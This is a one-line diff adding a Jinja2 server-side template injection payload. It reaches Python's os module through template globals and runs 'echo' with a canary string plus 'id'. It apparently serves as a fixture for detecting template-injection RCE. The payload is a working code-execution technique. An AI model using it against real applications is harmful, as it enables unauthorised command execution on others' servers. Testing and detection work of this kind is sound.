@@ -1,0 +1,1 @@
+RCE_START {{ cycler.__init__.__globals__.__builtins__.__import__("os").popen("echo SSTI_CANARY_9f3a2b; id").read() }} RCE_END
